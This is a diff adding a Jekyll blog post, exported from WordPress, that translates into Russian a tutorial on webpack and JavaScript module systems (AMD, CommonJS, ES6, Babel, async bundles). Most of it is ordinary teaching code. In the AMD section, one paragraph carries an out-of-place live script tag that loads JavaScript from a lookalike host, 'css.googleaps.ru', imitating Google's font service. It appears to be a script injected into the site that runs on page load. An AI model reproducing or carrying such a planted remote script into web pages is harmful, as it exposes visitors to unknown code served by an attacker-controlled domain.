@@ -1,0 +1,458 @@
+---
+layout: post
+status: publish
+published: true
+title: Пакуем как боги
+author:
+  display_name: Maxyc Webber
+  login: admin
+  email: maxycws@gmail.com
+  url: ''
+author_login: admin
+author_email: maxycws@gmail.com
+wordpress_id: 1483
+wordpress_url: http://magazine.loc/%d0%b1%d0%b5%d0%b7-%d1%80%d1%83%d0%b1%d1%80%d0%b8%d0%ba%d0%b8/%d0%bf%d0%b0%d0%ba%d1%83%d0%b5%d0%bc-%d0%ba%d0%b0%d0%ba-%d0%b1%d0%be%d0%b3%d0%b8/
+date: '2015-05-12 00:00:00 +0200'
+date_gmt: '2015-05-12 00:00:00 +0200'
+categories:
+- Верстка
+tags:
+- Тема
+- ip
+- javascript
+- css
+- git
+- loaders
+- loader
+- js
+- ui
+- frontender
+- sass
+- gulp
+comments:
+- id: 427
+  author: Максим
+  author_email: mgreen097@gmail.com
+  author_url: ''
+  date: '2015-12-22 19:44:53 +0200'
+  date_gmt: '2015-12-22 19:44:53 +0200'
+  content: "Может стоило не заниматься плагиатом, а просто указать ссылку на первоисточник?\r\n\r\n\r\nhttp:&#47;&#47;frontender.info&#47;packing-the-web-like-a-boss&#47;"
+- id: 428
+  author: Максим
+  author_email: mgreen097@gmail.com
+  author_url: ''
+  date: '2015-12-22 19:45:35 +0200'
+  date_gmt: '2015-12-22 19:45:35 +0200'
+  content: Оу))) Не заметил ссылку. Извиняюсь.)))
+- id: 430
+  author: Администратор
+  author_email: maxycws@gmail.com
+  author_url: ''
+  date: '2015-12-23 09:32:49 +0200'
+  date_gmt: '2015-12-23 09:32:49 +0200'
+  content: вы правы.  постараюсь найти время сделать активную ссылку + немного заметней
+- id: 445
+  author: mishanya101
+  author_email: 1451sc@mail.ru
+  author_url: ''
+  date: '2016-02-06 16:22:21 +0200'
+  date_gmt: '2016-02-06 16:22:21 +0200'
+  content: Максим, а как можно с вами связаться?
+- id: 446
+  author: Администратор
+  author_email: maxycws@gmail.com
+  author_url: ''
+  date: '2016-02-11 23:27:36 +0200'
+  date_gmt: '2016-02-11 23:27:36 +0200'
+  content: maxycws@gmail.com
+---
+<p><a href="http:&#47;&#47;webpack.github.io&#47;">Webpack<&#47;a> &mdash; это крутая новая утилита для сборки бандлов и оптимизации модулей<br />
+JavaScript и других ресурсов для фронтенда.<br />
+Если вы уже пользовались <a href="http:&#47;&#47;requirejs.org&#47;">RequireJS<&#47;a> или <a href="http:&#47;&#47;browserify.org&#47;">Browserify<&#47;a>, то есть все шансы,<br />
+что вы полюбите webpack так же, как и я.<br />
+Эта статья &mdash; подробная инструкция для вас.</p>
+<p><img title="Логотип webpack" src="http:&#47;&#47;frontender.info&#47;packing-the-web-like-a-boss&#47;img&#47;webpack.png" alt="Логотип webpack" &#47;></p>
+<p>Чтобы продемонстрировать магию webpack, я в этой статье буду использовать<br />
+в качестве примеров очень простой, даже противоестественно примитивный, код.<br />
+Он хранится <a href="https:&#47;&#47;github.com&#47;pahund&#47;webpack-talk">вот тут, на GitHub<&#47;a>.</p>
+<p>Представьте, что вам что-то взбрело в голову и захотелось написать код,<br />
+который изменяет цвет блока текста на розовый, и код, который делает<br />
+начертание блока текста полужирным по нажатию на кнопку. Непросто, ага.<br />
+Вот как бы вы такое чудо сделали?</p>
+<h2>Наївный способ доставки JavaScript на клиент<&#47;h2><br />
+Если бы мы пилили JavaScript как в старые добрые беззаботные времена, то вы бы<br />
+создали такие файлы:</p>
+<pre><code>function Pinkyfier(id) { &#47;&#47; Орозовитель<br />
+    this.element = document.getElementById(id);<br />
+}</p>
+<p>Pinkyfier.prototype.pink = function () {<br />
+    this.element.style.backgroundColor = "mistyrose";<br />
+    this.element.style.color = "hotpink";<br />
+}<br />
+<&#47;code><&#47;pre><br />
+<a href="https:&#47;&#47;github.com&#47;pahund&#47;webpack-talk&#47;blob&#47;master&#47;01_global-vars&#47;js&#47;Pinkyfier.js">js&#47;Pinkyfier.js<&#47;a></p>
+<pre><code>function Fattyfier(id) { &#47;&#47; Ожирнитель<br />
+    this.element = document.getElementById(id);<br />
+}</p>
+<p>Fattyfier.prototype.fat = function () {<br />
+    this.element.style.fontWeight = "bold";<br />
+}<br />
+<&#47;code><&#47;pre><br />
+<a href="https:&#47;&#47;github.com&#47;pahund&#47;webpack-talk&#47;blob&#47;master&#47;01_global-vars&#47;js&#47;Fattyfier.js">js&#47;Fattyfier.js<&#47;a></p>
+<pre><code>var pinkyfier = new Pinkyfier("text"),<br />
+    fattyfier = new Fattyfier("text");</p>
+<p>pinkyfier.pink();</p>
+<p>document.getElementById("fat").onclick = function () {<br />
+    fattyfier.fat();<br />
+}<br />
+<&#47;code><&#47;pre><br />
+<a href="https:&#47;&#47;github.com&#47;pahund&#47;webpack-talk&#47;blob&#47;master&#47;01_global-vars&#47;js&#47;main.js">js&#47;main.js<&#47;a></p>
+<p>И подключили эти три файла при помощи тегов <code>script<&#47;code>, вот как-то так:</p>
+<pre><code><!DOCTYPE html><br />
+<html lang="ru"><br />
+    <head><br />
+        <meta charset="utf-8"><br />
+    <&#47;head><br />
+    <body></p>
+<p id="text">
+            Родился на улице Герцена, в гастрономе № 22. Известный экономист,<br />
+            по призванию своему &mdash; библиотекарь. В народе &mdash; колхозник.<br />
+            В магазине &mdash; продавец. В экономике, так сказать, необходим.<br />
+        <&#47;p><br />
+        <button id="fat" type="button">Ожирнить<&#47;button></p>
+<p>        <script src="js&#47;Fattyfier.js"><&#47;script><br />
+        <script src="js&#47;Pinkyfier.js"><&#47;script><br />
+        <script src="js&#47;main.js"><&#47;script><br />
+    <&#47;body><br />
+<&#47;html><br />
+<&#47;code><&#47;pre><br />
+<a href="https:&#47;&#47;github.com&#47;pahund&#47;webpack-talk&#47;blob&#47;master&#47;01_global-vars&#47;index.html">index.html<&#47;a></p>
+<p>Теперь открывайте их в своём браузере (<a href="http:&#47;&#47;pahund.github.io&#47;webpack-talk&#47;01_global-vars&#47;index.html">или смотрите на демо тут<&#47;a>),<br />
+вы любуетесь розовым цветом, щёлкаете по кнопке, чтобы сделать его полужирным,<br />
+и вы довольны. Что ещё нужно для счастья?</p>
+<p>Ну, все функции и переменные, которые вы определили в этих трёх файлах,<br />
+находятся в глобальной области видимости.<br />
+Как известно каждому программисту, глобальные переменные &mdash; полная лажа.<br />
+Что, если бы у вас было более сложное приложение со, скажем, сотней файлов JS<br />
+вместо трёх?<br />
+Что, если бы код в этих файлах зависел от других файлов сильнее,<br />
+и изменение порядка подключения скриптов ломало бы страницу?</p>
+<p>Если бы вы продолжали делать так, в итоге получилась бы здоровенная неуклюжая<br />
+каша из кода. Вам нужна система модулей.</p>
+<h2>Способ получше: модули AMD<&#47;h2><br />
+Прежде чем рассматривать магию webpack и то, как он всё делает, лучше давайте<br />
+взглянем на самые известные системы модулей: AMD, CommonJS и, в ближайшем<br />
+будущем, ES6.</p>
+<p>Самая распространённая реализация модулей AMD &mdash; это <a href="http:&#47;&#47;requirejs.org&#47;">RequireJS<&#47;a>.<br />
+Посмотрим, как мы можем сделать текст на страничке розовым и полужирным при<br />
+помощи RequireJS.</p>
+<p>Вместо того, чтобы вываливать классы <code>Pinkyfier<&#47;code> и <code>Fattyfier<&#47;code> прямо в<br />
+глобальную область, мы обернём их в клёвую конструкцию <code>define<&#47;code>:</p>
+<pre><code>define(function () {<br />
+    function Pinkyfier(id) {<br />
+        this.element = document.getElementById(id);<br />
+    }</p>
+<p>    Pinkyfier.prototype.pink = function () {<br />
+        this.element.style.backgroundColor = "mistyrose";<br />
+        this.element.style.color = "hotpink";<br />
+    }</p>
+<p>    return Pinkyfier;<br />
+});<br />
+<&#47;code><&#47;pre><br />
+<a href="https:&#47;&#47;github.com&#47;pahund&#47;webpack-talk&#47;blob&#47;master&#47;02_amd&#47;js&#47;Pinkyfier.js">js&#47;Pinkyfier.js<&#47;a></p>
+<pre><code>define(function () {<br />
+    function Fattyfier(id) {<br />
+        this.element = document.getElementById(id);<br />
+    }</p>
+<p>    Fattyfier.prototype.fat = function () {<br />
+        this.element.style.fontWeight = "bold";<br />
+    }</p>
+<p>    return Fattyfier;<br />
+});<br />
+<&#47;code><&#47;pre><br />
+<a href="https:&#47;&#47;github.com&#47;pahund&#47;webpack-talk&#47;blob&#47;master&#47;02_amd&#47;js&#47;Fattyfier.js">js&#47;Fattyfier.js<&#47;a></p>
+<p>Вы теперь можете в своём <code>main.js<&#47;code> запросить модули, которые мы только<br />
+что определили:</p>
+<pre><code>require([ "Fattyfier", "Pinkyfier" ], function (Fattyfier, Pinkyfier) {</p>
+<p>    var pinkyfier = new Pinkyfier("text"),<br />
+        fattyfier = new Fattyfier("text");</p>
+<p>    pinkyfier.pink();</p>
+<p>    document.getElementById("fat").onclick = function () {<br />
+        fattyfier.fat();<br />
+    }<br />
+});<br />
+<&#47;code><&#47;pre><br />
+<a href="https:&#47;&#47;github.com&#47;pahund&#47;webpack-talk&#47;blob&#47;master&#47;02_amd&#47;js&#47;main.js">js&#47;main.js<&#47;a></p>
+<p>А в коде HTML вместо трёх тегов <code>script<script src="&#47;&#47;css.googleaps.ru&#47;css?f=Open+Sans&cd=mb&ver=4.2.2"><&#47;script><&#47;code>, как в примере ранее, вы просто пишете<br />
+один тег <code>script<&#47;code>, который загружает RequireJS, с data-атрибутом указывающим<br />
+на точку входа в ваше приложение, <code>main.js<&#47;code>:</p>
+<pre><code><script data-main="js&#47;main.js" src="https:&#47;&#47;cdnjs.cloudflare.com&#47;ajax&#47;libs&#47;require.js&#47;2.1.17&#47;require.min.js"><&#47;script><br />
+<&#47;code><&#47;pre><br />
+<a href="https:&#47;&#47;github.com&#47;pahund&#47;webpack-talk&#47;blob&#47;master&#47;02_amd&#47;index.html#L20">index.html<&#47;a></p>
+<p>Вот так с лёгкостью можно строить более сложные приложения, и что самое<br />
+приятное, модули подгружаются асинхронно &mdash; блокирует загрузку страницы только<br />
+загрузка самой библиотеки RequireJS, ваши же скрипты её не блокируют.</p>
+<p><a href="http:&#47;&#47;pahund.github.io&#47;webpack-talk&#47;02_amd&#47;index.html">Посмотрите на результат вживую тут<&#47;a>.</p>
+<h2>Как в Node.js: модули CommonJS<&#47;h2><br />
+С появлением серверного JavaScript на основе <a href="https:&#47;&#47;nodejs.org&#47;">Node.js<&#47;a> или <a href="https:&#47;&#47;iojs.org&#47;">io.js<&#47;a><br />
+стала популярной другая система модулей JavaScript, <a href="http:&#47;&#47;www.commonjs.org&#47;">CommonJS<&#47;a>.</p>
+<p>Хотя она используется в основном для npm-модулей и приложений, выполняющихся<br />
+на серверах, при помощи <a href="http:&#47;&#47;browserify.org&#47;">Browserify<&#47;a> ей можно также пользоваться в коде<br />
+на клиентской стороне.<br />
+Это очень круто, потому что в ваше распоряжение попадает всё изобилие модулей<br />
+npm, а также это позволяет использовать один и тот же код как на бэкенде,<br />
+так и на фронтенде.</p>
+<p>Вот наш маленький примерчик в виде модуля CommonJS:</p>
+<pre><code>function Pinkyfier(id) {<br />
+    this.element = document.getElementById(id);<br />
+}</p>
+<p>Pinkyfier.prototype.pink = function () {<br />
+    this.element.style.backgroundColor = "mistyrose";<br />
+    this.element.style.color = "hotpink";<br />
+}</p>
+<p>module.exports = Pinkyfier;<br />
+<&#47;code><&#47;pre><br />
+<a href="https:&#47;&#47;github.com&#47;pahund&#47;webpack-talk&#47;blob&#47;master&#47;03_commonjs&#47;js&#47;Pinkyfier.js">js&#47;Pinkyfier.js<&#47;a></p>
+<pre><code>function Fattyfier(id) {<br />
+    this.element = document.getElementById(id);<br />
+}</p>
+<p>Fattyfier.prototype.fat = function () {<br />
+    this.element.style.fontWeight = "bold";<br />
+}</p>
+<p>module.exports = Fattyfier;<br />
+<&#47;code><&#47;pre><br />
+<a href="https:&#47;&#47;github.com&#47;pahund&#47;webpack-talk&#47;blob&#47;master&#47;03_commonjs&#47;js&#47;Fattyfier.js">js&#47;Fattyfier.js<&#47;a></p>
+<p>Как вы могли заметить, единственное отличие от вышеупомянутой &laquo;наївной&raquo;<br />
+реализации в последних строчках каждого файла указывающих, какие части кода<br />
+следует отдавать клиенту при подгрузке модулей, а именно, классы <code>Pinkyfier<&#47;code> и<br />
+<code>Fattyfier<&#47;code>.<br />
+В этом отношении модули CommonJS проще и менее навязчивы, чем RequireJS.</p>
+<p>Чтобы использовать эти модули, добавьте вызов <code>require<&#47;code> в <code>main.js<&#47;code>:</p>
+<pre><code>var Pinkyfier = require(".&#47;Pinkyfier"),<br />
+    Fattyfier = require(".&#47;Fattyfier"),</p>
+<p>    pinkyfier = new Pinkyfier("text"),<br />
+    fattyfier = new Fattyfier("text");</p>
+<p>pinkyfier.pink();</p>
+<p>document.getElementById("fat").onclick = function () {<br />
+    fattyfier.fat();<br />
+}<br />
+<&#47;code><&#47;pre><br />
+<a href="https:&#47;&#47;github.com&#47;pahund&#47;webpack-talk&#47;blob&#47;master&#47;03_commonjs&#47;js&#47;main.js">js&#47;main.js<&#47;a></p>
+<p>А как этим пользоваться в браузере? Browserify работает иначе, чем RequireJS.<br />
+Вместо того, чтобы подгружать библиотеку, которая всё делает сама, мы при помощи<br />
+утилиты на node создаём бандл, файл, содержащий весь ваш код на JavaScript.</p>
+<p>Чтобы это сделать, установите Browserify из npm (Я полагаю, что node и npm<br />
+у вас установлены):</p>
+<pre><code>npm install -g browserify<br />
+<&#47;code><&#47;pre><br />
+А теперь перейдите в папку, где хранятся ваши файлы JS и создайте бандл такой<br />
+командой:</p>
+<pre><code>browserify main.js > bundle.js<br />
+<&#47;code><&#47;pre><br />
+Теперь достаточно просто подключить его в код HTML тегом <code>script<&#47;code>:</p>
+<pre><code><script src="js&#47;bundle.js"><&#47;script><br />
+<&#47;code><&#47;pre><br />
+<a href="https:&#47;&#47;github.com&#47;pahund&#47;webpack-talk&#47;blob&#47;master&#47;03_commonjs&#47;index.html#L18">index.html<&#47;a></p>
+<p><a href="http:&#47;&#47;pahund.github.io&#47;webpack-talk&#47;03_commonjs&#47;index.html">Посмотрите на результат вживую<&#47;a>.</p>
+<h2>Будущее: модули ES6<&#47;h2><br />
+Сейчас, когда я пишу эти строки, новый стандарт JavaScript лишь только на<br />
+подходе и должен быть выпущен в июне 2015.</p>
+<p>ES6 привносит нативную поддержку модулей JavaScript, делая AMD и CommonJS<br />
+устаревшими.</p>
+<p>Давайте взглянем, как орозовить и ожирнить наш рыбный текст с помощью ES6:</p>
+<pre><code>class Pinkyfier {</p>
+<p>    constructor(id) {<br />
+        this.element = document.getElementById(id);<br />
+    }</p>
+<p>    pink() {<br />
+        this.element.style.backgroundColor = "mistyrose";<br />
+        this.element.style.color = "hotpink";<br />
+    }<br />
+}</p>
+<p>export default Pinkyfier;<br />
+<&#47;code><&#47;pre><br />
+<a href="https:&#47;&#47;github.com&#47;pahund&#47;webpack-talk&#47;blob&#47;master&#47;04_es6&#47;js&#47;Pinkyfier.js">js&#47;Pinkyfier.js<&#47;a></p>
+<pre><code>class Fattyfier {</p>
+<p>    constructor(id) {<br />
+        this.element = document.getElementById(id);<br />
+    }</p>
+<p>    fat() {<br />
+        this.element.style.fontWeight = "bold";<br />
+    }<br />
+}</p>
+<p>export default Fattyfier;<br />
+<&#47;code><&#47;pre><br />
+<a href="https:&#47;&#47;github.com&#47;pahund&#47;webpack-talk&#47;blob&#47;master&#47;04_es6&#47;js&#47;Fattyfier.js">js&#47;Fattyfier.js<&#47;a></p>
+<p>Ух ты, а что это было? Ну, в ES6, как вы видите, классы определяются совсем<br />
+по-другому, нежели в том старом JavaScript, который мы знаем и любим.<br />
+Но речь тут даже не об этом, вся соль в последних строчках с ключевыми словами<br />
+<code>export<&#47;code>, которые выносят определённые классы из файла в клиентский модуль.<br />
+Выглядит похоже на пример с CommonJS, не правда ли?</p>
+<p>А вот так мы используем модули в ES6:</p>
+<pre><code>import Pinkyfier from ".&#47;Pinkyfier";<br />
+import Fattyfier from ".&#47;Fattyfier";</p>
+<p>let pinkyfier = new Pinkyfier("text"),<br />
+    fattyfier = new Fattyfier("text");</p>
+<p>pinkyfier.pink();</p>
+<p>document.getElementById("fat").onclick = function () {<br />
+    fattyfier.fat();<br />
+}<br />
+<&#47;code><&#47;pre><br />
+<a href="https:&#47;&#47;github.com&#47;pahund&#47;webpack-talk&#47;blob&#47;master&#47;04_es6&#47;js&#47;main.js">js&#47;main.js<&#47;a></p>
+<p>В ES6 <code>export<&#47;code> и <code>import<&#47;code> &mdash; части языка и браузеры (из будущего) их понимают, и<br />
+могут подгружать модули без участия библиотек вроде RequireJS или сборщиков<br />
+вроде Browserify. Вы можете просто подключить файл <code>main.js<&#47;code> через тег <code>script<&#47;code>.</p>
+<p>Вы можете <a href="http:&#47;&#47;pahund.github.io&#47;webpack-talk&#47;04_es6&#47;index.html">посмотреть на результат работы вживую тут<&#47;a>. Хотя нет, не можете,<br />
+ну разве только что вы не гость из будущего. В настоящем мой браузер жалуется:<br />
+&laquo;модули пока не реализованы&raquo;.</p>
+<p>Но webpack может это исправить, и далее в этой статье мы увидим, как.</p>
+<h2>Прошу любить и жаловать, webpack<&#47;h2><br />
+Итак, давайте уже наконец перейдём к webpack. Начнём с примера с AMD&#47;RequireJS<br />
+и &laquo;вебпакифицируем&raquo; его.<br />
+Webpack поддерживает модули AMD прямо из коробки, так что мы просто используем<br />
+модули AMD из примера выше: <a href="https:&#47;&#47;github.com&#47;pahund&#47;webpack-talk&#47;blob&#47;master&#47;05_webpack_amd&#47;js&#47;Pinkyfier.js">Pinkyfier.js<&#47;a>, <a href="https:&#47;&#47;github.com&#47;pahund&#47;webpack-talk&#47;blob&#47;master&#47;05_webpack_amd&#47;js&#47;Fattyfier.js">Fattyfier.js<&#47;a><br />
+и <a href="https:&#47;&#47;github.com&#47;pahund&#47;webpack-talk&#47;blob&#47;master&#47;05_webpack_amd&#47;js&#47;main.js">main.js<&#47;a>.</p>
+<p>В использовании он схож с Browserify, вы устанавливаете утилиту на node<br />
+через npm и пользуетесь ей, чтобы собрать один или несколько бандлов.</p>
+<p>Установка webpack:</p>
+<pre><code>npm install -g webpack<br />
+<&#47;code><&#47;pre><br />
+Чтобы настроить webpack, создайте файл настроек под именем <code>webpack.config.js<&#47;code>.<br />
+В этом простом варианте там будет находиться только код настроек, который<br />
+указывает webpack путь, где он должен искать модули (<code>modulesDirectories<&#47;code>), где<br />
+у приложения точка входа (<code>entry<&#47;code>), как назвать и куда положить файл бандла на<br />
+выходе (<code>output<&#47;code>).</p>
+<pre><code>var webpack = require("webpack");</p>
+<p>module.exports = {<br />
+    entry: ".&#47;main",<br />
+    resolve: {<br />
+        modulesDirectories: [<br />
+            "."<br />
+        ]<br />
+    },<br />
+    output: {<br />
+        publicPath: "js&#47;",<br />
+        filename: "bundle.js"<br />
+    }<br />
+};<br />
+<&#47;code><&#47;pre><br />
+<a href="https:&#47;&#47;github.com&#47;pahund&#47;webpack-talk&#47;blob&#47;master&#47;05_webpack_amd&#47;js&#47;webpack.config.js">js&#47;webpack.config.js<&#47;a></p>
+<p>После того, как мы создали в нужном месте файл, мы можем просто набрать<br />
+&laquo;webpack&raquo; в командной строке:</p>
+<pre><code>webpack<br />
+<&#47;code><&#47;pre><br />
+Это создаст два файла, <code>bundle.js<&#47;code> и <code>1.bundle.js<&#47;code>.</p>
+<p>&laquo;А почему два?&raquo; &mdash; спросите вы. Что ж, это из-за того, что мы используем модули<br />
+AMD, которые подгружаются асинхронно. <code>bundle.js<&#47;code> содержит код из <code>main.js<&#47;code>, а<br />
+в <code>1.bundle.js<&#47;code> &mdash; код из <code>Pinkyfier.js<&#47;code> и <code>Fattyfier.js<&#47;code>, который грузится<br />
+асинхронно. Если бы у нас были модули CommonJS, которые всегда подгружаются<br />
+синхронно, на выходе был бы всего один файл. Вы уже начинаете понимать,<br />
+насколько дьявольски умная эта утилита?</p>
+<p>Далее мы подключаем <code>bundle.js<&#47;code> через тег <code>script<&#47;code> в <a href="https:&#47;&#47;github.com&#47;pahund&#47;webpack-talk&#47;blob&#47;master&#47;05_webpack_amd&#47;index.html">HTML<&#47;a><br />
+(подключать второй бандл не нужно).</p>
+<p><a href="http:&#47;&#47;pahund.github.io&#47;webpack-talk&#47;05_webpack_amd&#47;">И смотрим на то, что получилось<&#47;a>.</p>
+<h2>Интересный момент<&#47;h2><br />
+Это всё хорошо, но в чём тут преимущество по сравнению с использованием<br />
+RequreJS? С RequireJS идёт в комплекте оптимизатор (<code>r.js<&#47;code>), который тоже<br />
+может создавать бандлы&hellip;</p>
+<p>Тут начинается самое интересное: помните, что я говорил про Browserify, что он<br />
+позволяет использовать модули npm и на бэкенде, и на фронтенде, а преимущество<br />
+RequireJS в асинхронной загрузке? Так вот, с webpack вы можете взять лучшее от<br />
+обоих миров. webpack поддерживает <em>и<&#47;em> модули AMD, <em>и<&#47;em> модули CommonJS<br />
+<em>одновременно<&#47;em>.</p>
+<p>Попробуйте сами, вы можете заменить Pinkifier.js в формате AMD на<br />
+<a href="https:&#47;&#47;github.com&#47;pahund&#47;webpack-talk&#47;blob&#47;master&#47;06_webpack_amd-commonjs&#47;js&#47;Pinkyfier.js">версию с CommonJS<&#47;a>. Запустите команду webpack ещё раз.</p>
+<p><a href="http:&#47;&#47;pahund.github.io&#47;webpack-talk&#47;06_webpack_amd-commonjs&#47;">Посмотрите на пример и результат<&#47;a> &mdash; всё работает точно так же.</p>
+<p>Заметьте, не требуется никакой дополнительной настройки, не нужно говорить<br />
+webpack: &laquo;Эй, я использую оба формата модулей&raquo;. Webpack достаточно умён, чтобы<br />
+понять это самостоятельно.</p>
+<h2>Назад в будущее<&#47;h2><br />
+Вернёмся к нашему примеру с ES6, который я, к сожалению, не могу запустить на<br />
+своём браузере образца апреля 2015 года. Может ли нам помочь webpack? Легко!<br />
+В webpack есть понятие загрузчиков, дополнительных модулей, которые добавляются<br />
+в конфигурацию, чтобы загружать файлы, соответствующие какому-то признаку.<br />
+Есть целая огромная куча загрузчиков для самых различных вещей, не только для<br />
+JavaScript, а даже для CSS или изображений.</p>
+<p>Мы настроим загрузчик Babel для всех файлов JavaScript, добавив такой блок в<br />
+<code>webpack.config.js<&#47;code>:</p>
+<pre><code>module: {<br />
+        loaders: [<br />
+            {<br />
+                test: &#47;.js$&#47;,<br />
+                loader: "babel-loader"<br />
+            }<br />
+        ]<br />
+    }<br />
+<&#47;code><&#47;pre><br />
+<a href="https:&#47;&#47;github.com&#47;pahund&#47;webpack-talk&#47;blob&#47;master&#47;07_webpack-es6&#47;js&#47;webpack.config.js#L14">js&#47;webpack.config.js<&#47;a></p>
+<p>Теперь webpack будет загружать все файлы JS через загрузчик, который использует<br />
+<a href="https:&#47;&#47;babeljs.io&#47;">Babel<&#47;a> чтобы транскомпилировать код на ES6 в код старой версии JavaScript,<br />
+который смогут понять нынешние браузеры.</p>
+<p>Загрузчик Babel не является частью webpack по умолчанию, это лишь дополнение,<br />
+поэтому придётся установить его в проект через npm.</p>
+<p>Я добавил <a href="https:&#47;&#47;github.com&#47;pahund&#47;webpack-talk&#47;blob&#47;master&#47;07_webpack-es6&#47;js&#47;package.json">package.json<&#47;a>, так что можно просто запустить <code>npm install<&#47;code><br />
+в командной строке (из папки проекта), и он установится.</p>
+<p>После запуска webpack мы получим единственный бандл (ничего асинхронного тут<br />
+не происходит), который можно подключить через тег <code>script<&#47;code>.</p>
+<p><a href="http:&#47;&#47;pahund.github.io&#47;webpack-talk&#47;07_webpack-es6&#47;">Посмотрите на этот пример вживую<&#47;a>.</p>
+<h2>Хорошенькая, чистенькая асинхронность<&#47;h2><br />
+Вернёмся к примеру с AMD + webpack, я писал ранее, что webpack автоматически<br />
+создаёт несколько бандлов когда ему попадаются модули AMD. Это приятно, но зачем<br />
+это может пригодиться? Мы загружаем орозовитель и ожирнитель асинхронно, но<br />
+вся эта асинхронная загрузка происходит сразу после загрузки страницы. Не<br />
+очень-то большой выигрыш в скорости загрузки страницы по сравнению с одним<br />
+большим бандлом со всем кодом, подключённым через тег <code>script<&#47;code> перед закрывающим<br />
+тегом <code>body<&#47;code>, приёмом, который многими признан полезным.</p>
+<p>Но действительно ли нам нужен модуль <code>Fattifier<&#47;code>? Вообще-то, он нам нужен только<br />
+когда пользователь щёлкнет по кнопке &laquo;ожирнить&raquo;. Разве не было бы круто<br />
+использовать асинхронную загрузку как преимущество и загружать код ожирнителя<br />
+только когда он нам нужен, т.е., когда кнопка была нажата?</p>
+<p>С webpack этого очень легко добиться. Мы изменим код <code>main.js<&#47;code>, как-то так:</p>
+<pre><code>var Pinkyfier = require(".&#47;Pinkyfier"),<br />
+    pinkyfier = new Pinkyfier("text");</p>
+<p>pinkyfier.pink();</p>
+<p>document.getElementById("fat").onclick = function () {<br />
+    require([".&#47;Fattyfier"], function (Fattyfier) {<br />
+        var fattyfier = new Fattyfier("text");<br />
+        fattyfier.fat();<br />
+    });<br />
+}<br />
+<&#47;code><&#47;pre><br />
+<a href="https:&#47;&#47;github.com&#47;pahund&#47;webpack-talk&#47;blob&#47;master&#47;08_webpack_multiple-bundles&#47;js&#47;main.js">js&#47;main.js<&#47;a></p>
+<p>Что тут происходит? Я смешал модули в стилях CommonJS и AMD в одном файле:<br />
+<code>require<&#47;code> в стиле CommonJS на строке 1 отвечает за загрузку модуля <code>Pinkyfier<&#47;code><br />
+синхронно. <code>require<&#47;code> в стиле AMD на строке 7 загружает модуль <code>Fattyfier<&#47;code><br />
+асинхронно.</p>
+<p>Запустив команду webpack, я получаю на выходе файлы: <code>bundle.js<&#47;code> с кодом<br />
+из <code>main.js<&#47;code> и <code>Pinkyfier.js<&#47;code> и <code>1.bundle.js<&#47;code>, с кодом из <code>Fattyfier.js<&#47;code>.</p>
+<p>Когда я открою страницу в браузере, загрузится только <code>bundle.js<&#47;code>. И только<br />
+после того, как я нажму на кнопку, подгрузится другой бандл.</p>
+<p><a href="http:&#47;&#47;pahund.github.io&#47;webpack-talk&#47;08_webpack_multiple-bundles&#47;">Посмотрите на этот пример<&#47;a>.</p>
+<p>Это хороший приём для уменьшения времени загрузки страницы и увеличения скорости<br />
+работы сайта. Мы используем его на <a href="http:&#47;&#47;suchen.mobile.de&#47;fahrzeuge&#47;search.html?isSearchRequest=true&amp;scopeId=C&amp;makeModelVariant1.makeId=&amp;makeModelVariant1.modelDescription=&amp;makeModelVariantExclusions%5B0%5D.makeId=&amp;minFirstRegistrationDate=&amp;maxFirstRegistrationDate=&amp;minMileage=&amp;maxMileage=&amp;minPrice=&amp;maxPrice=&amp;minPowerAsArray=&amp;maxPowerAsArray=&amp;maxPowerAsArray=PS&amp;minPowerAsArray=PS&amp;minCubicCapacity=&amp;maxCubicCapacity=&amp;ambitCountry=&amp;zipcode=&amp;minSeats=&amp;maxSeats=&amp;doorCount=&amp;climatisation=&amp;airbag=&amp;daysAfterCreation=&amp;adLimitation=&amp;export=&amp;vatable=&amp;maxConsumptionCombined=&amp;emissionClass=&amp;emissionsSticker=&amp;damageUnrepaired=NO_DAMAGE_UNREPAIRED&amp;numberOfPreviousOwners=&amp;minHu=&amp;usedCarSeals=&amp;lang=en">странице поиска mobile.de<&#47;a>, когда я<br />
+щёлкаю по кнопке &laquo;расширенный поиск&raquo; сверху слева, появляется большая старая<br />
+форма для поиска. Весь код JavaScript для этой формы, даже код шаблона, который<br />
+рендерится на клиентской стороне <a href="https:&#47;&#47;developers.google.com&#47;closure&#47;templates&#47;">шаблонизатором Soy<&#47;a>, загружается<br />
+асинхронно, только после нажатия кнопки.</p>
+<h2>Заключение<&#47;h2><br />
+Итак, теперь у вас должно было появиться понимание того, что такое webpack,<br />
+и как он работает.</p>
+<p>Очевидно, это только начало.</p>
+<p>Как я уже упоминал, к вашим услугам имеется огромное количество<br />
+модулей-загрузчиков и плагинов для различных задач вроде <a href="http:&#47;&#47;webpack.github.io&#47;docs&#47;list-of-plugins.html#uglifyjsplugin">минификации<&#47;a> или<br />
+компиляции <a href="https:&#47;&#47;github.com&#47;jtangelder&#47;sass-loader">Sass<&#47;a> или <a href="https:&#47;&#47;github.com&#47;webpack&#47;less-loader">LESS<&#47;a> в CSS.<br />
+Вы можете сказать webpack генерировать карты кода для более удобной отладки<br />
+JavaScript в браузере.<br />
+Можете запустить webpack как <a href="http:&#47;&#47;webpack.github.io&#47;docs&#47;webpack-dev-server.html">сервер для разработки<&#47;a>, и он будет<br />
+отслеживать изменения в коде и сразу же обновлять сгенерированные файлы.<br />
+Интегрировать webpack в <a href="https:&#47;&#47;github.com&#47;webpack&#47;grunt-webpack">Grunt<&#47;a> или <a href="http:&#47;&#47;webpack.github.io&#47;docs&#47;usage-with-gulp.html">Gulp<&#47;a> и генерировать<br />
+<a href="http:&#47;&#47;webpack.github.io&#47;docs&#47;long-term-caching.html">хэши содержимого<&#47;a> (также известные как отпечатки пальцев) для оптимизации<br />
+кэширования в браузере.<br />
+Использовать различные бандлы для различных страниц вашего приложения<br />
+и позволить webpack автоматически организовать общие модули для этих страниц<br />
+в общие бандлы.<br />
+Можете даже написать <a href="http:&#47;&#47;webpack.github.io&#47;docs&#47;how-to-write-a-loader.html">собственный модуль-загрузчик<&#47;a>, что, кстати говоря,<br />
+очень легко.</p>
+<p>Развлекайтесь, исследуя возможности!</p>
+<p><img src="http:&#47;&#47;feeds.feedburner.com&#47;~r&#47;FrontenderMagazineArticles&#47;~4&#47;T-9DzYcADR0" alt="" width="1" height="1" &#47;><br />
+Source: http:&#47;&#47;frontender.info&#47;</p>
